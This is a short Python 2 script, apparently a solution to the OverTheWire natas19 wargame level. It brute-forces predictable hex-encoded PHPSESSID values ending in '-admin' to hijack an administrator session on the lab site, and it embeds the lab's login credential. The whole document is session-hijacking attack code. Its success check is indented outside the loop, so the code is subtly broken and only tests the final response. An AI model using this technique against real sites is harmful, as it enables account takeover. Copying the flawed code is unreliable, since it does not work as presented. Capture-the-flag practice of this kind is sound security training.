#!/usr/bin/python

import requests
from requests.auth import HTTPBasicAuth

data = {'admin':1, 'username': 'admin', 'password':'test'}

print('Finding the password for natas20...')
for i in range(1,1000):
	cookie = {'PHPSESSID' : (str(i) + '-admin').encode('hex'), 'path':'/', '':'HttpOnly'}
	s = requests.session()
	r = s.post('http://natas19.natas.labs.overthewire.org/index.php', data = data, cookies = cookie, auth = HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))
if "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20." not in r.content:
	print r.content
